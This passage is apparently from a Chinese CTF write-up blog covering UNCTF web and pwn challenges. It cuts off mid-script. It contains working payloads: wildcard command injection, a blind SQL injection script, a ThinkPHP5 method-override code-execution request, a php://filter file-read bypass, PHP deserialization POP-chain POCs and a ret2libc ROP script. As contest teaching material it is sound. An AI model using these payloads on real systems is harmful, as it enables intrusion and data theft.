<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=`/?in/gre?%20-R%20ctf`</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/45.png" alt=""></p>
<p>发现flag</p>
<p>不过这是非预期解，联系出题人以后，出题人也把<code>\\</code>位置换到<code>\^</code>的前面，预期解是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23</span><br></pre></td></tr></table></figure>

<p>实质上还是因为正则<code>\\</code>匹配不到<code>\</code>的问题，使用了换行<code>%0a</code>，再结合linux的<strong>命令终止符</strong><code>%20#</code>处理双引号，最终的命令为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file &quot;\&quot; &quot;</span><br><span class="line">/???/gr?p -R ctf #&quot;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/46.png" alt=""></p>
<h3 id="easy-admin（1000-points）"><a href="#easy-admin（1000-points）" class="headerlink" title="easy_admin（1000 points）"></a>easy_admin（1000 points）</h3><p>靶机地址：101.71.29.5:10045 </p>
<p>打开靶机，是一个登陆界面</p>
<p><img src="../../../../img/UNCTF/47.png" alt=""></p>
<p>file参数存在文件包含，尝试LFI发现过滤了<strong>://</strong>，无法使用伪协议</p>
<p>扫描目录，发现存在<strong>admin.php</strong></p>
<p><img src="../../../../img/UNCTF/48.png" alt=""></p>
<p>另外还有个<strong>forget.php</strong></p>
<p>思路就应该是要登陆admin，在<strong>forget.php</strong>中发现<strong>username</strong>存在注入点，用户名不存在时会返回no this user，利用这个点进行布尔盲注</p>
<p>fuzz发现过滤了<strong>or</strong>，<strong>and</strong>，<strong>select</strong>等关键字，用<strong>&amp;&amp;</strong>来代替<strong>and</strong>即可，盲注脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10045/index.php?file=forget"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">128</span>):</span><br><span class="line">        data= &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"admin' &amp;&amp; ascii(substr(password,%d,1))=%d#"</span>%(i,j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"no this user"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/51.png" alt=""></p>
<p>跑出admin的密码：<strong>flag{never_too</strong></p>
<p>然后登陆admin</p>
<p><img src="../../../../img/UNCTF/49.png" alt=""></p>
<p>提示我们：<strong>admin will access the website from</strong>，于是加个头部字段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/50.png" alt=""></p>
<p>拿到另一半flag</p>
<p>最后的flag就是：flag{never_too_late_to_x}</p>
<h3 id="easy-pentest（1000-points）"><a href="#easy-pentest（1000-points）" class="headerlink" title="easy_pentest（1000 points）"></a>easy_pentest（1000 points）</h3><p>靶机地址：101.71.29.5:10021</p>
<p>根据题目的两个hint：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hint1:tp框架特性 </span><br><span class="line">Hint2:万物皆有其根本，3.x版本有，5.x也有，严格来说只能算信息泄露</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/56.png" alt=""></p>
<p>测试发现，我们输入index.php等已知的tp文件，都会自动跳转回<strong>not_safe.html</strong>，我们首先要找到泄露信息的点，获得权限去访问</p>
<p>信息泄露，就想到了去查看tp日志</p>
<p>通过fuzz，发现<strong>runtime/log/201910/02.log</strong>存在信息泄露</p>
<p><img src="../../../../img/UNCTF/57.png" alt=""></p>
<p><img src="../../../../img/UNCTF/58.png" alt=""></p>
<p>发现一个关键的参数<strong>safe_key</strong>，然后根据上面写的头部再次访问</p>
<p><img src="../../../../img/UNCTF/59.png" alt=""></p>
<p>访问成功，跳转到了<strong>safe_page.html</strong>，并获取到了tp版本为<strong>5</strong></p>
<p>接下来，就是去找tp5是否存在已知爆出的远程rce的漏洞：</p>
<p><a href="https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81" target="_blank" rel="noopener">ThinkPHP5漏洞分析之代码执行(十) </a></p>
<p><img src="../../../../img/UNCTF/60.png" alt=""></p>
<p>果然有，漏洞点是tp5的<strong>method</strong>代码执行，漏洞触发点在<strong>call_user_func</strong>函数</p>
<p><img src="../../../../img/UNCTF/62.png" alt=""> </p>
<p>直接拿payload打过去</p>
<p><img src="../../../../img/UNCTF/61.png" alt=""></p>
<p>成功执行，后面测试发现过滤了如下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file关键字</span><br><span class="line"></span><br><span class="line">php短标签：</span><br><span class="line">&lt;?php</span><br><span class="line">&lt;?</span><br><span class="line">&lt;?=</span><br><span class="line"></span><br><span class="line">php伪协议：</span><br><span class="line">php://filter</span><br><span class="line"></span><br><span class="line">disable_functions:system,shell_exec,exec,proc_open,passthru等命令执行函数</span><br></pre></td></tr></table></figure>

<p>另外php版本是<strong>7.1</strong>，也就是说<strong>assert</strong>不能动态调用了，而<strong>eval</strong>在php手册中已经写道：是一个<strong>language construct</strong>，而不是一个函数，所以也不能通过<strong>call_user_func</strong>来调用</p>
<p><img src="../../../../img/UNCTF/63.png" alt=""></p>
<p>所以我们能利用的就只有读取文件<strong>show_source</strong>和扫描目录<strong>scandir</strong></p>
<p>show_source可以很轻松的读到<strong>/etc/passwd</strong>，但是不知道flag文件路径</p>
<p><img src="../../../../img/UNCTF/65.png" alt=""></p>
<p>但是<strong>scandir</strong>会因为是返回数组而无法输出</p>
<p>所以得想办法，输出<strong>scandir</strong></p>
<p>参考：<a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">记一次有趣的tp5代码执行</a></p>
<p>里面提到<strong>filter</strong>可以通过传递多个来对参数进行多次的处理</p>
<p><img src="../../../../img/UNCTF/66.png" alt=""></p>
<p>所以，可以先传入<strong>filter[]=scandir&amp;get[]=/</strong>，这样读取完目录后。传入<strong>filter[]=var_dump</strong>，就可以成功输出扫描目录结果了</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php?safe_key=easy_pentesnt_is_s0fun HTTP/1.1</span><br><span class="line">Host: 101.71.29.5:10021</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">x-requested-with: XMLHttpRequest</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Cookie: thinkphp_show_page_trace=0|0; hibext_instdsigdipv2=1</span><br><span class="line">Referer: http://101.71.29.5:10021/public/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Content-Length: 84</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;method=get&amp;server[]=1&amp;filter[]=scandir&amp;get[]=/&amp;filter[]=var_dump</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/67.png" alt=""></p>
<p>flag文件在<strong>/home</strong>目录下</p>
<p><img src="../../../../img/UNCTF/68.png" alt=""></p>
<p>最后读取flag</p>
<p><img src="../../../../img/UNCTF/69.png" alt=""></p>
<h3 id="K-amp-K战队的老家（1000-points）"><a href="#K-amp-K战队的老家（1000-points）" class="headerlink" title="K&amp;K战队的老家（1000 points）"></a>K&amp;K战队的老家（1000 points）</h3><p>靶机地址：101.71.29.5:10007 </p>
<p>打开靶机，是一个登陆界面</p>
<p><img src="../../../../img/UNCTF/70.png" alt=""></p>
<p>用万能密码即可登陆：</p>
<p><img src="../../../../img/UNCTF/71.png" alt=""></p>
<p>登录框fuzz发现过滤了很多注入关键字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#,-,/,*,select,and,or,by等</span><br></pre></td></tr></table></figure>

<p>所以，登录框除了登陆，判断不存在盲注点</p>
<p>登陆后，给了我们一串看不懂的cookie：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%26144%2616a%2615f%26123%2613f%26159%2613a%2616a%2614a%26148%2613e%2616a%26151%26147%26129%26165%26139%2615a%2615f%2616a%2613f%2615e%26164%2616a%2613f%2615a%26149%26126%26139%2615d%2613e%2615f%26152%26122%26129%2616a%2614a%26143%26139%26127%26151%26144%2615f%26168%2613f%26123%2613d%26126%2613d%2615a%2615f%26159%26151%26147%26141%26159%2613f%26122%2615b%26126%2613d%26144%26164%2616a%2613f%2615a%26157%26126%26139%2615e%26146%2616a%2614a%26148%2613a%26165%26149%26147%26121%2615c%26139%2615a%26164%2616a%2613f%2615a%26153%26126%26139%2615e%26146%26165%26149%26147%26142%26164%26151%26147%26124%26159%2613f%26123%26120%2612d</span><br></pre></td></tr></table></figure>

<p>然后来到后台，源码中发现有个<strong>debug</strong>功能，并且<strong>m</strong>参数疑似存在<strong>文件包含</strong></p>
<p><img src="../../../../img/UNCTF/72.png" alt=""></p>
<p>访问<strong>debug</strong></p>
<p><img src="../../../../img/UNCTF/73.png" alt=""></p>
<p>提示cookie出错，猜想可能需要伪造一个正确的cookie，才能使用debug功能，那么就需要获取源码</p>
<p><strong>m</strong>参数过滤了关键字<strong>php</strong>和<strong>base64</strong>，尝试大小写，发现可以绕过，读取源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=PHP://filter/convert.Base64-encode/resource=home</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/74.png" alt=""></p>
<p>拿到源码后，审计发现，在<strong>debug.php</strong>的魔术方法<strong>__toString</strong>中，存在包含<strong>flag.php</strong>文件的操作，那么这就是我们最后要执行的地方</p>
<p><img src="../../../../img/UNCTF/75.png" alt=""></p>
<p>触发<strong>__toString</strong>魔术方法的条件就是把类当作字符串输出，对应<strong>debug.php</strong>的<strong>debug</strong>方法的末尾方法</p>
<p><img src="../../../../img/UNCTF/76.png" alt=""></p>
<p>要触发<strong>debug</strong>方法，就在<strong>home.php</strong>末尾代码：</p>
<p><img src="../../../../img/UNCTF/77.png" alt=""></p>
<p>但是中间有许多waf需要我们bypass</p>
<p>（1）check函数：<code>check($cookie, $db, $session);</code></p>
<p><img src="../../../../img/UNCTF/78.png" alt=""></p>
<p>此处存在反序列点，而且<strong>$objstr</strong>对应cookie的<strong>identity</strong>字段，没用过滤，是可控的，我们可以进行任意的反序列化操作</p>
<p>这里只需要没反序列化正确，就能通过</p>
<p>（2）index_check函数：<strong>index_check($session-&gt;id, $session-&gt;username);</strong></p>
<p><img src="../../../../img/UNCTF/79.png" alt=""></p>
<p>返回结果数量不能小于4，即我们反序列化后对象的username和id字段拼接道Sql语句后必须有查询结果</p>
<p>（3）debug类的<strong>__construct</strong>魔术方法，<strong>check1</strong>函数</p>
<p><img src="../../../../img/UNCTF/80.png" alt=""></p>
<p><img src="../../../../img/UNCTF/81.png" alt=""></p>
<p>检查对象的username字段是否为<strong>debuger</strong>，意思是我们查询的用户名必须是<strong>debuger</strong>，<strong>check1</strong>函数同理</p>
<p>（4）最后输出<code>echo $this-&gt;forbidden;</code><img src="../../../../img/UNCTF/82.png" alt=""></p>
<p>虽然前后矛盾，但是细看，第一个比较是<code>===</code>，而第二个比较<strong>switch</strong>则是弱类型比较即<code>==</code>，所以我们可以让<strong>$this-&gt;choose</strong>为<strong>“2”</strong>，即可绕过过滤</p>
<p>综上，写出如下POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">public</span> $forbidden = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;forbidden = unserialize(<span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> debug();</span><br><span class="line"><span class="comment">//echo serialize($d);</span></span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($d));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行得到cookie的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;144&amp;16a&amp;15f&amp;121&amp;13f&amp;159&amp;13a&amp;15b&amp;14a&amp;147&amp;13a&amp;121&amp;14a&amp;169&amp;139&amp;126&amp;13e&amp;15a&amp;160&amp;127&amp;153&amp;16a&amp;15f&amp;122&amp;13f&amp;159&amp;13a&amp;15a&amp;151&amp;137&amp;129&amp;166&amp;153&amp;122&amp;145&amp;159&amp;13f&amp;123&amp;13d&amp;126&amp;13d&amp;144&amp;15f&amp;159&amp;13d&amp;159&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;125&amp;13f&amp;159&amp;13a&amp;15d&amp;152&amp;123&amp;13a&amp;159&amp;151&amp;147&amp;142&amp;15b&amp;14a&amp;147&amp;124&amp;159&amp;13f&amp;120&amp;128&amp;126&amp;13e&amp;144&amp;15f&amp;159&amp;14a&amp;137&amp;146&amp;159&amp;154&amp;147&amp;153&amp;159&amp;13f&amp;15a&amp;149&amp;126&amp;155&amp;123&amp;13d&amp;126&amp;13e&amp;15a&amp;15f&amp;159&amp;149&amp;122&amp;158&amp;166&amp;152&amp;123&amp;13e&amp;15c&amp;139&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;135&amp;126&amp;139&amp;15a&amp;139&amp;159&amp;13f&amp;123&amp;13d&amp;126&amp;13f&amp;144&amp;15f&amp;159&amp;14a&amp;15d&amp;129&amp;169&amp;149&amp;15d&amp;15c&amp;15b&amp;14a&amp;137&amp;146&amp;165&amp;139&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;131&amp;126&amp;139&amp;159&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;168&amp;13d&amp;15a&amp;15f&amp;159&amp;149&amp;147&amp;13e&amp;15a&amp;14a&amp;148&amp;13e&amp;16a&amp;148&amp;123&amp;142&amp;166&amp;151&amp;122&amp;146&amp;165&amp;139&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;131&amp;126&amp;139&amp;159&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;169&amp;13f&amp;159&amp;13a&amp;166&amp;149&amp;159&amp;139&amp;127&amp;144&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;139&amp;126&amp;139&amp;15d&amp;15c&amp;15b&amp;139&amp;15a&amp;164&amp;160&amp;13f&amp;15a&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;124&amp;13f&amp;159&amp;13a&amp;121&amp;153&amp;122&amp;146&amp;169&amp;152&amp;15d&amp;136&amp;164&amp;14a&amp;143&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;123&amp;13f&amp;159&amp;13a&amp;15b&amp;14a&amp;147&amp;13a&amp;121&amp;14a&amp;122&amp;146&amp;169&amp;139&amp;15a&amp;164&amp;129&amp;153&amp;16a&amp;15f&amp;168&amp;13d&amp;15a&amp;15f&amp;159&amp;149&amp;147&amp;13e&amp;15a&amp;14a&amp;148&amp;13e&amp;16a&amp;148&amp;123&amp;142&amp;166&amp;151&amp;122&amp;146&amp;165&amp;139&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;131&amp;126&amp;139&amp;159&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;169&amp;13f&amp;159&amp;13a&amp;166&amp;149&amp;159&amp;139&amp;127&amp;144&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;139&amp;126&amp;139&amp;15d&amp;15c&amp;15b&amp;139&amp;15a&amp;164&amp;160&amp;13f&amp;15a&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;124&amp;13f&amp;159&amp;13a&amp;121&amp;153&amp;122&amp;146&amp;169&amp;152&amp;15d&amp;136&amp;164&amp;14a&amp;143&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;123&amp;13f&amp;159&amp;13a&amp;15b&amp;14a&amp;147&amp;13a&amp;121&amp;14a&amp;122&amp;146&amp;169&amp;139&amp;15a&amp;164&amp;129</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/83.png" alt=""></p>
<p>传入后发现，此时已经成功包含<strong>flag.php</strong>，但是，提示了一段信息：<strong>token error</strong>，并且告诉我们在flag.php中还包含了<strong>access.php</strong></p>
<p>猜想可能对应类中的<strong>access_token</strong>参数，但是因为是include，所以我们看不到flag.php的源码</p>
<p>这里也是卡了很久，后来才发现有备份文件：<strong>access.php.bak</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$hack_token = <span class="string">'3ecReK&amp;key'</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$d = unserialize(<span class="keyword">$this</span>-&gt;funny);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么，我们再添加一个参数<strong>$this-&gt;funny</strong>，反序列化后的<strong>access_token</strong>为<strong>3ecReK&amp;key</strong>即可</p>
<p>最终POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">public</span> $forbidden = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line">    <span class="keyword">public</span> $funny = <span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&amp;key";s:2:"ob";N;&#125;'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;forbidden = unserialize(<span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> debug();</span><br><span class="line"><span class="comment">//echo serialize($d);</span></span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($d));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/UNCTF/84.png" alt=""></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context.log_level=<span class="string">'debug'</span> </span><br><span class="line">p=remote(<span class="string">"101.71.29.5"</span>,<span class="number">10041</span>) </span><br><span class="line">elf=ELF(<span class="string">"./babyrop"</span>) </span><br><span class="line">main_addr = elf.got[<span class="string">'__libc_start_main'</span>] </span><br><span class="line">print(hex(main_addr)) </span><br><span class="line">puts_addr=elf.plt[<span class="string">'puts'</span>] </span><br><span class="line">puts_got_addr=elf.got[<span class="string">'puts'</span>] </span><br><span class="line">start_addr=<span class="number">0x08048592</span> </span><br><span class="line">gdb.attach(p) </span><br><span class="line">p.sendlineafter(<span class="string">"Hello CTFer!"</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p32(<span class="number">1717986918</span>)) </span><br><span class="line">p.sendlineafter(<span class="string">"What is your name?"</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'a'</span>*<span class="number">4</span>+p32(puts_addr)+p32(start_addr)+p32(puts_got_addr)) </span><br><span class="line">a=p.recvuntil(<span class="string">"Hello CTFer!"</span>) </span><br><span class="line">print(a[<span class="number">1</span>:<span class="number">5</span>]) puts_libc_addr=u32(a[<span class="number">1</span>:<span class="number">5</span>]) </span><br><span class="line">print(hex(puts_libc_addr)) </span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x20</span>+p32(<span class="number">1717986918</span>)) </span><br><span class="line">p.sendlineafter(<span class="string">"What is your name?"</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'a'</span>*<span class="number">4</span>+p32(puts_addr)+p32(start_addr)+p32(main_addr)) </span><br><span class="line">main_libc_addr=u32(p.recvuntil(<span class="string">"Hello 